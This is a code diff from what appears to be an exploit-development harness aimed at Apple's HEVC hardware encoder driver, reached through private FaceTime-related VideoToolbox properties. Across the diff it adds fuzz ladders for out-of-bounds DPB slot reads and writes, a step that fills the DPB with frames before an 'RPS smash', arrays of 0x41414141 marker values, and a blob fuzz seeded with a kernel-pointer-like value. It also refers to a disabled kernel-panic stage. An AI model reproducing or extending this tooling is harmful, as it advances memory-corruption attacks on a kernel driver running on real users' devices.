@@ -50,6 +50,43 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     }
 }
 
+// One isolated DPB test on a FRESH session (analyst 222830: the first -12912
+// latches the session into permanent malfunction - every later row on it is
+// fiction). Builds the EnableUserRef-only recipe, clean IDR, then set+encode.
+static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
+    NSMutableArray *sink = [NSMutableArray array];
+    NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
+    VTCompressionSessionRef s = NULL;
+    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                                             (__bridge CFDictionaryRef)spec, NULL, NULL,
+                                             KPH9AttsCB, (__bridge void *)sink, &s);
+    if (st != noErr || !s) return [NSString stringWithFormat:@"create=%d", (int)st];
+    VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+    VTCompressionSessionPrepareToEncodeFrames(s);
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
+    if (pb) {
+        VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    }
+    OSStatus sProp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"),
+                                          (__bridge CFTypeRef)payload);
+    OSStatus fProp = -1;
+    [sink removeAllObjects];
+    if (pb) {
+        NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": payload };
+        fProp = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(ptsSeed, 30), kCMTimeInvalid,
+                                                (__bridge CFDictionaryRef)fp, NULL, NULL);
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    }
+    NSString *cb = sink.count ? sink[0] : @"(no cb)";
+    if (pb) CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(s);
+    CFRelease(s);
+    return [NSString stringWithFormat:@"set=%d enc=%d cb=%@", (int)sProp, (int)fProp, cb];
+}
+
 @interface KPH9EncoderModule ()
 @property (nonatomic, copy) NSString *identifier;
 @property (nonatomic, copy) NSString *title;
@@ -235,6 +272,14 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
             s4, pb, CMTimeMake(0, 30), dur,
             (__bridge CFDictionaryRef)idrProps, NULL, &flags);
         [report appendFormat:@"encode[0] clean IDR -> %d (flags=0x%x)\n", (int)status, flags];
+
+        // Analyst 222830: the RPS smash referenced delta_poc frames that do not
+        // exist in the DPB (only 1 IDR) - warm the DPB with real P-frames first.
+        for (int w = 1; w <= 18; w++) {
+            VTCompressionSessionEncodeFrame(s4, pb, CMTimeMake(w, 30), dur, NULL, NULL, &flags);
+        }
+        VTCompressionSessionCompleteFrames(s4, kCMTimeInvalid);
+        [report appendString:@"DPB warmed with 18 P-frames before smash\n"];
 
         NSDictionary *frameProps = @{
             @"UserRPSForFaceTime": @[rpsDict],
@@ -1048,44 +1093,41 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     // with -17691 (Test B), while Test A's setter-only setup encodes fine.
     // Session property path for the DPB array is dead (-12912) - the array must
     // ride in frameProperties of a P-frame AFTER a clean IDR filled the DPB.
-    [report appendString:@"\n--- UserDPB element schema probe v2 (no EncoderUsage in encSpec) ---\n"];
-    NSMutableArray *cbSink = [NSMutableArray array];
-    NSDictionary *encSpec = @{
-        @"EnableUserRefForFacetime": @YES,
-    };
-    VTCompressionSessionRef sS = NULL;
-    OSStatus stS = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-        (__bridge CFDictionaryRef)encSpec, NULL, NULL,
-        KPH9AttsCB, (__bridge void *)cbSink, &sS);
-    [report appendFormat:@"create with encSpec(EnableUserRef only) -> %d\n", (int)stS];
-    if (stS == noErr && sS) {
-        VTSessionSetProperty(sS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
-        VTSessionSetProperty(sS, CFSTR("AllocateRVRABuffers"), kCFBooleanTrue);
-        OSStatus prepS = VTCompressionSessionPrepareToEncodeFrames(sS);
-        CVPixelBufferRef pbS = NULL;
-        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
-                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbS);
-        [report appendFormat:@"prepare=%d\n", (int)prepS];
-        // Clean IDR first (Test A shape): no frameProperties at all.
-        [cbSink removeAllObjects];
-        OSStatus stE0 = -1;
-        if (pbS) {
-            stE0 = VTCompressionSessionEncodeFrame(sS, pbS, CMTimeMake(0, 30), kCMTimeInvalid,
-                                                   NULL, NULL, NULL);
-            VTCompressionSessionCompleteFrames(sS, kCMTimeInvalid);
+    [report appendString:@"\n--- UserDPB element schema probe v2 (isolated session per row) ---\n"];
+    {
+        // Prologue on one session: the clean-IDR recipe proof.
+        NSMutableArray *cbSink = [NSMutableArray array];
+        NSDictionary *encSpec = @{ @"EnableUserRefForFacetime": @YES };
+        VTCompressionSessionRef sS = NULL;
+        OSStatus stS = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)encSpec, NULL, NULL,
+            KPH9AttsCB, (__bridge void *)cbSink, &sS);
+        [report appendFormat:@"create with encSpec(EnableUserRef only) -> %d\n", (int)stS];
+        if (stS == noErr && sS) {
+            VTSessionSetProperty(sS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+            VTSessionSetProperty(sS, CFSTR("AllocateRVRABuffers"), kCFBooleanTrue);
+            VTCompressionSessionPrepareToEncodeFrames(sS);
+            CVPixelBufferRef pbS = NULL;
+            CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbS);
+            if (pbS) {
+                VTCompressionSessionEncodeFrame(sS, pbS, CMTimeMake(0, 30), kCMTimeInvalid,
+                                                NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sS, kCMTimeInvalid);
+            }
+            [report appendString:@"clean IDR prologue done\n"];
+            for (NSString *line in cbSink) [report appendFormat:@"  %@\n", line];
+            if (pbS) CVPixelBufferRelease(pbS);
+            VTCompressionSessionInvalidate(sS);
+            CFRelease(sS);
         }
-        [report appendFormat:@"encode[0] clean IDR -> %d\n", (int)stE0];
-        for (NSString *line in cbSink) {
-            [report appendFormat:@"  %@\n", line];
-        }
-
-        // DPB array via frameProperties on P-frames: schemas x sizes (1..32).
+        // Grid on ISOLATED sessions - a latched fault must not poison the next row.
         NSMutableArray *schemas = [NSMutableArray arrayWithArray:@[
             @"num0", @"num1", @"data8", @"data32", @"pocslot", @"frameid", @"index", @"ourd"
         ]];
         int sizes[] = { 1, 16, 24, 32 };
-        int64_t ptsCounter = 1;
+        int64_t ptsCounter = 100;
         for (NSString *schema in schemas) {
             for (int si = 0; si < 4; si++) {
                 int n = sizes[si];
@@ -1111,128 +1153,132 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
                                          @"IsLongTerm": @NO, @"SlotIndex": @(e & 0x1F)}];
                     }
                 }
-                [cbSink removeAllObjects];
-                OSStatus sProp = VTSessionSetProperty(sS, CFSTR("UserDPBFramesForFaceTime"),
-                                                      (__bridge CFTypeRef)arr);
-                NSDictionary *frameProps = @{ @"UserDPBFramesForFaceTime": arr };
-                OSStatus fProp = -1;
-                if (pbS) {
-                    fProp = VTCompressionSessionEncodeFrame(sS, pbS,
-                                                            CMTimeMake(ptsCounter++, 30),
-                                                            kCMTimeInvalid,
-                                                            (__bridge CFDictionaryRef)frameProps,
-                                                            NULL, NULL);
-                    VTCompressionSessionCompleteFrames(sS, kCMTimeInvalid);
-                }
-                [report appendFormat:@"  dpb[%@ x%-2d] sessionSet=%d frameEncode=%d cb=%@\n",
-                 schema, n, (int)sProp, (int)fProp,
-                 cbSink.count ? cbSink[0] : @"(no cb)"];
+                [report appendFormat:@"  dpb[%@ x%-2d] %@\n",
+                 schema, n, KPH9DPBProbe(arr, ptsCounter++)];
             }
         }
-        if (pbS) CVPixelBufferRelease(pbS);
-        VTCompressionSessionInvalidate(sS);
-        CFRelease(sS);
     }
 
-    // === DPB slot OOB ladders (analyst 221032) ===
-    // num0 x32 delivered cb st=0 against a standard 16-slot DPB - the array
-    // reaches AppleAVE2. Now find the edge: size beyond 32, and whether the
-    // CFNumber indexes DPB[idx] unchecked (the real OOB write/read).
-    [report appendString:@"\n--- DPB slot OOB ladders ---\n"];
-    NSMutableArray *dpbCb = [NSMutableArray array];
-    NSDictionary *dpbSpec2 = @{ @"EnableUserRefForFacetime": @YES };
-    VTCompressionSessionRef sD = NULL;
-    OSStatus stD = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-        (__bridge CFDictionaryRef)dpbSpec2, NULL, NULL,
-        KPH9AttsCB, (__bridge void *)dpbCb, &sD);
-    if (stD == noErr && sD) {
-        VTSessionSetProperty(sD, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
-        VTSessionSetProperty(sD, CFSTR("AllocateRVRABuffers"), kCFBooleanTrue);
-        VTCompressionSessionPrepareToEncodeFrames(sD);
-        CVPixelBufferRef pbD2 = NULL;
-        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
-                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbD2);
-        int64_t ptsD = 0;
-        if (pbD2) {
-            VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
-                                            NULL, NULL, NULL);
-            VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
-        }
+    // === DPB slot OOB ladders (analyst 221032 + 222830 isolation) ===
+    // Every row runs on a FRESH session: the first -12912 latches the old
+    // session into permanent malfunction and silently faked the later rows.
+    [report appendString:@"\n--- DPB slot OOB ladders (isolated) ---\n"];
+    {
+        int64_t ptsD = 200;
         // (1) size ladder: how far does CFNumber delivery go?
         int sizeLadder[] = { 64, 128, 256, 512, 1024, 4096 };
         for (int si = 0; si < 6; si++) {
             int n = sizeLadder[si];
             NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
             for (int e = 0; e < n; e++) [arr addObject:@(e)];
-            [dpbCb removeAllObjects];
-            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
-            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
-            OSStatus fe = -1;
-            if (pbD2) {
-                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
-                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
-                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
-            }
-            [report appendFormat:@"  size[num0 x%-4d] set=%d enc=%d cb=%@\n",
-             n, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+            [report appendFormat:@"  size[num0 x%-4d] %@\n", n, KPH9DPBProbe(arr, ptsD++)];
         }
         // (2) value ladder: does the CFNumber index DPB[idx] unchecked?
         long long vals[] = { 15, 16, 17, 31, 32, 64, 255, -1, 0x7fffffffLL, 0x4141414141414141LL };
         for (int vi = 0; vi < 10; vi++) {
-            long long v = vals[vi];
             NSMutableArray *arr = [NSMutableArray array];
-            for (int e = 0; e < 16; e++) [arr addObject:@(v)];
-            [dpbCb removeAllObjects];
-            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
-            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
-            OSStatus fe = -1;
-            if (pbD2) {
-                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
-                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
-                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
-            }
-            [report appendFormat:@"  val=0x%llx x16 set=%d enc=%d cb=%@\n",
-             v, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+            for (int e = 0; e < 16; e++) [arr addObject:@(vals[vi])];
+            [report appendFormat:@"  val=0x%llx x16 %@\n", vals[vi], KPH9DPBProbe(arr, ptsD++)];
         }
         // (3) data8 boundaries: length ladder x1, then count ladder at 8B
         int lenLadder[] = { 8, 16, 24, 32, 64, 128, 256, 1024 };
         for (int li2 = 0; li2 < 8; li2++) {
-            int len = lenLadder[li2];
-            NSMutableData *d = [NSMutableData dataWithLength:(NSUInteger)len];
-            NSMutableArray *arr = @[ d ].mutableCopy;
-            [dpbCb removeAllObjects];
-            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
-            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
-            OSStatus fe = -1;
-            if (pbD2) {
-                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
-                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
-                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
-            }
-            [report appendFormat:@"  data8 len=%-4d x1 set=%d enc=%d cb=%@\n",
-             len, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+            NSMutableData *d = [NSMutableData dataWithLength:(NSUInteger)lenLadder[li2]];
+            [report appendFormat:@"  data8 len=%-4d x1 %@\n", lenLadder[li2],
+             KPH9DPBProbe(@[ d ], ptsD++)];
         }
         int cntLadder[] = { 2, 3, 4, 8, 15, 16 };
         for (int ci2 = 0; ci2 < 6; ci2++) {
             int n = cntLadder[ci2];
             NSMutableArray *arr = [NSMutableArray array];
             for (int e = 0; e < n; e++) [arr addObject:[NSMutableData dataWithLength:8]];
-            [dpbCb removeAllObjects];
-            OSStatus sp = VTSessionSetProperty(sD, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
-            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
-            OSStatus fe = -1;
-            if (pbD2) {
-                fe = VTCompressionSessionEncodeFrame(sD, pbD2, CMTimeMake(ptsD++, 30), kCMTimeInvalid,
-                                                     (__bridge CFDictionaryRef)fp, NULL, NULL);
-                VTCompressionSessionCompleteFrames(sD, kCMTimeInvalid);
-            }
-            [report appendFormat:@"  data8 x%-2d set=%d enc=%d cb=%@\n",
-             n, (int)sp, (int)fe, dpbCb.count ? dpbCb[0] : @"(no cb)"];
+            [report appendFormat:@"  data8 x%-2d %@\n", n, KPH9DPBProbe(arr, ptsD++)];
         }
-        if (pbD2) CVPixelBufferRelease(pbD2);
-        VTCompressionSessionInvalidate(sD);
-        CFRelease(sD);
+    }
+
+    // === Warmup binary search (analyst patch 2): fill the DPB with 18 real
+    // reference frames FIRST (beyond the 16 slots), then submit marker arrays
+    // n = 32..64 to find the exact cutoff and any slot-index OOB.
+    [report appendString:@"\n--- DPB warmup + num0 cutoff 32..64 ---\n"];
+    {
+        NSMutableArray *sink = [NSMutableArray array];
+        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
+        VTCompressionSessionRef sW = NULL;
+        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                                       (__bridge CFDictionaryRef)spec, NULL, NULL,
+                                       KPH9AttsCB, (__bridge void *)sink, &sW) == noErr && sW) {
+            VTSessionSetProperty(sW, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+            VTCompressionSessionPrepareToEncodeFrames(sW);
+            CVPixelBufferRef pbW = NULL;
+            CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbW);
+            if (pbW) {
+                VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(0, 30), kCMTimeInvalid,
+                                                NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sW, kCMTimeInvalid);
+                for (int w = 1; w <= 18; w++) {
+                    VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(w, 30), kCMTimeInvalid,
+                                                    NULL, NULL, NULL);
+                }
+                VTCompressionSessionCompleteFrames(sW, kCMTimeInvalid);
+            }
+            [report appendString:@"  DPB warmed with 1 IDR + 18 P-frames\n"];
+            int lastOK = 0, firstReject = 0;
+            for (int n = 32; n <= 64; n++) {
+                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
+                for (int k = 0; k < n; k++) [arr addObject:@(0x4141414100000000ULL | (unsigned)k)];
+                OSStatus st = VTSessionSetProperty(sW, CFSTR("UserDPBFramesForFaceTime"),
+                                                   (__bridge CFTypeRef)arr);
+                OSStatus fe = -1;
+                if (pbW) {
+                    [sink removeAllObjects];
+                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
+                    fe = VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(30 + n, 30),
+                                                         kCMTimeInvalid,
+                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(sW, kCMTimeInvalid);
+                }
+                if (st == 0) lastOK = n;
+                else if (!firstReject) firstReject = n;
+                if (st != 0 || fe != 0 || n == 64) {
+                    [report appendFormat:@"  warm n=%-2d set=%d enc=%d cb=%@\n",
+                     n, (int)st, (int)fe, sink.count ? sink[0] : @"(no cb)"];
+                }
+            }
+            [report appendFormat:@"  warmup cutoff: last_ok=%d first_reject=%d\n", lastOK, firstReject];
+            if (pbW) CVPixelBufferRelease(pbW);
+            VTCompressionSessionInvalidate(sW);
+            CFRelease(sW);
+        }
+    }
+
+    // === data8 content fuzz (analyst patch 3b): the single CFData blob (8..1024B
+    // accepted!) is parsed by AVE as a reference/RPS parameter structure.
+    [report appendString:@"\n--- data8 content fuzz (len x pattern) ---\n"];
+    {
+        int64_t ptsF = 400;
+        int lens[] = { 32, 64, 128, 256, 1024 };
+        for (int li = 0; li < 5; li++) {
+            int len = lens[li];
+            for (int pat = 0; pat < 4; pat++) {
+                NSMutableData *d = [NSMutableData dataWithLength:(NSUInteger)len];
+                uint8_t *b = (uint8_t *)d.mutableBytes;
+                if (pat == 0) { memset(b, 0x00, (size_t)len); }
+                else if (pat == 1) { memset(b, 0x41, (size_t)len); }
+                else if (pat == 2) {
+                    for (int o = 0; o + 8 <= len; o += 8) {
+                        *(uint64_t *)(b + o) = (uint64_t)o;
+                    }
+                } else {
+                    uint64_t cand = 0xfffffe3100000059ULL;
+                    for (int o = 0; o + 8 <= len; o += 8) {
+                        *(uint64_t *)(b + o) = cand;
+                    }
+                }
+                [report appendFormat:@"  data8 len=%-4d pat=%d %@\n", len, pat,
+                 KPH9DPBProbe(@[ d ], ptsF++)];
+            }
+        }
     }
 
     // === stage9 PANIC RUNG â€” DISABLED ===
